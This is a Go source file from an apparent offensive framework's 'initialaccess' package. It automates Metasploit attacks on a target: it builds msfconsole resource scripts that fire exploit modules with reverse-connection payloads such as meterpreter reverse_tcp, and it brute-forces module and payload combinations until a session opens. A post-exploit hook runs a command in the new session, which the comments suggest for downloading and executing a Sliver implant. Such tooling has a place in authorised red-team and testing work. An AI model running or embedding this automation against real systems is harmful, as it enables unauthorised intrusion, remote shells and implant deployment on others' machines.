package initialaccess

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"regexp"
	"sort"
	"strconv"
	"strings"
)

// MetasploitModule is a built-in initial-access module that drives Metasploit
// Framework exploits via msfconsole resource scripts.
//
// It supports brute-force mode: when "module" and/or "payload" are JSON arrays,
// every combination is tried in sequence until a session is opened (or all fail).
//
// Config keys:
//
//	module            (required) MSF exploit module, e.g. "exploit/multi/http/...".
//	                  Accepts a JSON array for brute-force: ["mod1","mod2"].
//	payload           (optional) payload name, e.g. "linux/x64/meterpreter/reverse_tcp".
//	                  Accepts a JSON array for brute-force.
//	lhost             (required) listen host for reverse connections.
//	lport             (optional) listen port (default "4444").
//	options           (optional) JSON object of extra MSF set commands.
//	                  e.g. {"THREADS":"10","SMBUser":"admin"}
//	target_index      (optional) MSF target index (set TARGET).
//	session_wait      (optional) seconds to wait for session after exploit (default 15).
//	msfconsole        (optional) path to msfconsole binary (default "msfconsole").
//	stop_on_success   (optional) "false" to run all brute-force combos (default "true").
//	post_exploit_cmd  (optional) command to run in the first opened MSF session
//	                  (useful for downloading+executing a Sliver implant).
//	extra_args        (optional) extra arguments appended to msfconsole.
type MetasploitModule struct{}

// Name implements Module.
func (m *MetasploitModule) Name() string { return "metasploit" }

// Run implements Module.
func (m *MetasploitModule) Run(ctx context.Context, req Request) (Result, error) {
	cfg := req.Config

	msfPath := cfgStr(cfg, "msfconsole", "msfconsole")
	lhost := cfg["lhost"]
	if lhost == "" {
		return Result{}, errors.New("metasploit module requires 'lhost' config key")
	}
	lport := cfgStr(cfg, "lport", "4444")
	sessionWait := cfgInt(cfg, "session_wait", 15)
	stopOnSuccess := cfgBool(cfg, "stop_on_success", true)
	targetIndex := cfg["target_index"]
	postExploitCmd := cfg["post_exploit_cmd"]

	modules, err := parseStringList(cfg, "module")
	if err != nil {
		return Result{}, fmt.Errorf("parsing 'module': %w", err)
	}
	if len(modules) == 0 {
		return Result{}, errors.New("metasploit module requires 'module' config key (exploit module name or JSON array)")
	}

	payloads, err := parseStringList(cfg, "payload")
	if err != nil {
		return Result{}, fmt.Errorf("parsing 'payload': %w", err)
	}

	var extraOpts map[string]string
	if raw := cfg["options"]; raw != "" {
		if err := json.Unmarshal([]byte(raw), &extraOpts); err != nil {
			return Result{}, fmt.Errorf("parsing 'options' as JSON object: %w", err)
		}
	}

	// Build attempt matrix: modules × payloads.
	type attempt struct {
		module  string
		payload string
	}
	var attempts []attempt
	if len(payloads) == 0 {
		for _, mod := range modules {
			attempts = append(attempts, attempt{mod, ""})
		}
	} else {
		for _, mod := range modules {
			for _, p := range payloads {
				attempts = append(attempts, attempt{mod, p})
			}
		}
	}

	var firstSuccess Result
	var lastNote string
	for i, att := range attempts {
		rc := buildMSFResourceScript(req.Target, att.module, att.payload,
			lhost, lport, targetIndex, extraOpts, sessionWait, postExploitCmd)

		tmp, err := os.CreateTemp("", "msf-*.rc")
		if err != nil {
			return Result{}, fmt.Errorf("creating temp resource file: %w", err)
		}
		tmpPath := tmp.Name()
		defer os.Remove(tmpPath)
		if _, err := tmp.WriteString(rc); err != nil {
			tmp.Close()
			return Result{}, fmt.Errorf("writing resource file: %w", err)
		}
		tmp.Close()

		args := []string{"-q", "-r", tmpPath}
		if extra := strings.TrimSpace(cfg["extra_args"]); extra != "" {
			args = append(args, strings.Fields(extra)...)
		}

		cmd := exec.CommandContext(ctx, msfPath, args...)
		var stdout, stderr bytes.Buffer
		cmd.Stdout = &stdout
		cmd.Stderr = &stderr
		runErr := cmd.Run()

		if runErr != nil {
			var exitErr *exec.ExitError
			if !errors.As(runErr, &exitErr) {
				return Result{}, fmt.Errorf("running msfconsole %v: %w (stderr: %s)",
					args, runErr, strings.TrimSpace(stderr.String()))
			}
		}

		info := parseMSFSessionInfo(stdout.String())
		if info.opened {
			note := fmt.Sprintf("session opened via %s", att.module)
			if att.payload != "" {
				note += fmt.Sprintf(" / %s", att.payload)
			}
			if len(attempts) > 1 {
				note += fmt.Sprintf(" (attempt %d of %d)", i+1, len(attempts))
			}
			result := Result{Ok: true, Note: note, Hostname: info.hostname}
			if stopOnSuccess || i == len(attempts)-1 {
				return result, nil
			}
			if !firstSuccess.Ok {
				firstSuccess = result
			}
		}
		lastNote = fmt.Sprintf("attempt %d/%d (%s) — no session",
			i+1, len(attempts), att.module)
	}

	if firstSuccess.Ok {
		return firstSuccess, nil
	}
	if len(attempts) > 1 {
		lastNote = fmt.Sprintf("all %d attempts failed; last: %s",
			len(attempts), lastNote)
	}
	return Result{Ok: false, Note: lastNote}, nil
}

// parseStringList reads a config key as either a plain string or a JSON array
// of strings.
func parseStringList(cfg map[string]string, key string) ([]string, error) {
	raw, ok := cfg[key]
	if !ok || strings.TrimSpace(raw) == "" {
		return nil, nil
	}
	trimmed := strings.TrimSpace(raw)
	if strings.HasPrefix(trimmed, "[") {
		var list []string
		if err := json.Unmarshal([]byte(trimmed), &list); err != nil {
			return nil, err
		}
		return list, nil
	}
	return []string{trimmed}, nil
}

// buildMSFResourceScript generates an msfconsole resource script for a single
// exploit+payload attempt.
func buildMSFResourceScript(target Target, module, payload, lhost, lport,
	targetIndex string, extraOpts map[string]string, sessionWait int,
	postExploitCmd string) string {
	var b strings.Builder
	fmt.Fprintf(&b, "use %s\n", module)
	fmt.Fprintf(&b, "set RHOSTS %s\n", target.Host)
	if target.Port > 0 {
		fmt.Fprintf(&b, "set RPORT %d\n", target.Port)
	}
	fmt.Fprintf(&b, "set LHOST %s\n", lhost)
	fmt.Fprintf(&b, "set LPORT %s\n", lport)
	if payload != "" {
		fmt.Fprintf(&b, "set payload %s\n", payload)
	}
	if targetIndex != "" {
		fmt.Fprintf(&b, "set TARGET %s\n", targetIndex)
	}
	keys := make([]string, 0, len(extraOpts))
	for k := range extraOpts {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	for _, k := range keys {
		fmt.Fprintf(&b, "set %s %s\n", k, extraOpts[k])
	}
	b.WriteString("exploit -j -z\n")
	fmt.Fprintf(&b, "sleep %d\n", sessionWait)
	b.WriteString("sessions -l\n")
	if postExploitCmd != "" {
		escaped := strings.ReplaceAll(postExploitCmd, "'", "\\'")
		fmt.Fprintf(&b, "ruby { if framework.sessions.count > 0; sid = framework.sessions.keys.first; framework.sessions[sid].run_single('%s'); end }\n", escaped)
	}
	b.WriteString("exit -y\n")
	return b.String()
}

type msfSessionInfo struct {
	opened   bool
	hostname string
}

var msfSessionOpenedRe = regexp.MustCompile(`(?i)session\s+\d+\s+opened`)
var msfSessionHostRe = regexp.MustCompile(`->\s*([\d.]+):\d+`)

func parseMSFSessionInfo(output string) msfSessionInfo {
	var info msfSessionInfo
	if msfSessionOpenedRe.MatchString(output) {
		info.opened = true
		if m := msfSessionHostRe.FindStringSubmatch(output); len(m) > 1 {
			info.hostname = m[1]
		}
	}
	return info
}

func cfgStr(cfg map[string]string, key, def string) string {
	if v := cfg[key]; v != "" {
		return v
	}
	return def
}

func cfgInt(cfg map[string]string, key string, def int) int {
	if v := cfg[key]; v != "" {
		if n, err := strconv.Atoi(v); err == nil {
			return n
		}
	}
	return def
}

func cfgBool(cfg map[string]string, key string, def bool) bool {
	switch strings.ToLower(cfg[key]) {
	case "true", "1", "yes":
		return true
	case "false", "0", "no":
		return false
	default:
		return def
	}
}
